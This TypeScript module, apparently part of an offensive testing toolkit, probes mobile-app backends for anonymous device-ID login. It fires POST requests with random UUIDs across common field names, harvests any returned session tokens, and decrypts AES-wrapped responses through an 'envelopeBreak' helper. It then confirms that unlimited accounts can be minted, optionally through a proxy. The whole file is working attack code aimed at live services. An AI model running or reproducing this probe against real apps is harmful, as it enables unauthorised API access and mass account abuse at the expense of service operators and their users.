import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";
import { dualShaSplit } from "./envelopeBreak.js";
import { createDecipheriv } from "node:crypto";

/** Anonymous device-registration login: many mobile backends hand out session
 *  tokens to a bare deviceId with no phone/email/captcha. Enumerates the
 *  device-id shape (uuid, uuid-with-prefix, imei-like, android-id hex), finds
 *  the field name the endpoint accepts (devId/deviceId/uuid/…), and reports
 *  whether unlimited accounts are mintable. A hit means the entire app API is
 *  reachable without owning a phone number. */

export interface DeviceLoginInput {
  readonly url: string;
  readonly outputRoot: string;
  /** Restrict probe bodies; default matrix covers the common shapes. */
  readonly bodyTemplate?: string;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  readonly headers?: Record<string, string>;
  /** AES envelope key; when set, {"data":"…"} responses are decrypted before
   *  the token hunt. */
  readonly cipherKey?: string;
}

export interface DeviceLoginTry {
  readonly field: string;
  readonly deviceId: string;
  readonly status: number;
  readonly accepted: boolean;
  readonly tokenField?: string;
  readonly tokenPrefix?: string;
  readonly evidence: string;
}

export interface DeviceLoginResult {
  readonly working: DeviceLoginTry[];
  readonly unlimited: boolean;
  readonly artifacts: { path: string; bytes: number }[];
}

const FIELDS = ["devId", "deviceId", "device_id", "uuid", "udid", "did"];
const TOKEN_KEYS = ["token", "accessToken", "access_token", "sessionToken", "sessionId", "jwt"];

const uuid = (): string => {
  const h = "0123456789abcdef";
  let out = "";
  for (let i = 0; i < 32; i++) out += h[Math.floor(Math.random() * 16)];
  return `${out.slice(0, 8)}-${out.slice(8, 12)}-4${out.slice(13, 16)}-8${out.slice(17, 20)}-${out.slice(20, 32)}`;
};

const unwrap = (body: string, key?: string): string => {
  if (!key) return body;
  try {
    const doc = JSON.parse(body) as { data?: string };
    if (typeof doc.data !== "string" || doc.data.length < 24) return body;
    const cipher = Buffer.from(doc.data.trim(), "base64");
    const { key: k, iv } = dualShaSplit(key, cipher);
    const d = createDecipheriv("aes-256-cbc", k, iv);
    const out = Buffer.concat([d.update(cipher.subarray(12)), d.final()]).toString("utf8");
    return out === "nil" ? body : out;
  } catch { return body; }
};

const findToken = (body: string): { field: string; prefix: string } | null => {
  try {
    const walk = (o: unknown): { field: string; prefix: string } | null => {
      if (!o || typeof o !== "object") return null;
      if (Array.isArray(o)) { for (const x of o) { const r = walk(x); if (r) return r; } return null; }
      for (const [k, v] of Object.entries(o as Record<string, unknown>)) {
        if (TOKEN_KEYS.includes(k) && typeof v === "string" && v.length > 20) return { field: k, prefix: v.slice(0, 16) };
        if (/token/i.test(k) && typeof v === "string" && v.length > 20) return { field: k, prefix: v.slice(0, 16) };
        const nested = walk(v);
        if (nested) return nested;
      }
      return null;
    };
    return walk(JSON.parse(body));
  } catch { return null; }
};

export const probeDeviceLogin = async (input: DeviceLoginInput): Promise<DeviceLoginResult> => {
  const working: DeviceLoginTry[] = [];
  const tries: DeviceLoginTry[] = [];
  for (const field of FIELDS) {
    const id = uuid();
    const body = input.bodyTemplate
      ? input.bodyTemplate.replaceAll("{DEVICE}", id)
      : JSON.stringify({ [field]: id });
    const r = await fetchUrl(input.url, {
      method: "POST", body,
      headers: { "content-type": body.trim().startsWith("{") ? "application/json" : "application/x-www-form-urlencoded", ...(input.headers ?? {}) },
      maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 12_000, maxBytes: 512 * 1024,
    });
    // 200 + token-shaped field = accepted; 4xx naming the field = field exists but needs more.
    const tok = findToken(unwrap(r.body, input.cipherKey));
    const accepted = r.status >= 200 && r.status < 300 && tok !== null;
    const evidence = tok ? `${field} accepted, token field "${tok.field}" (${tok.prefix}…)` : `${field} → ${r.status}${r.body.slice(0, 60)}`;
    const row: DeviceLoginTry = { field, deviceId: id, status: r.status, accepted, tokenField: tok?.field, tokenPrefix: tok?.prefix, evidence };
    tries.push(row);
    if (accepted) working.push(row);
  }
  // Second device id on the winning field proves unlimited minting.
  let unlimited = false;
  if (working[0]) {
    const id2 = uuid();
    const body = JSON.stringify({ [working[0].field]: id2 });
    const r2 = await fetchUrl(input.url, {
      method: "POST", body, headers: { "content-type": "application/json", ...(input.headers ?? {}) },
      maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 12_000, maxBytes: 512 * 1024,
    });
    unlimited = r2.status >= 200 && r2.status < 300 && findToken(unwrap(r2.body, input.cipherKey)) !== null;
  }
  const doc = JSON.stringify({ url: input.url, tries, working, unlimited }, null, 2);
  const artifact = await writeArtifact(input.outputRoot, "device_login.json", doc);
  return { working, unlimited, artifacts: [artifact] };
};
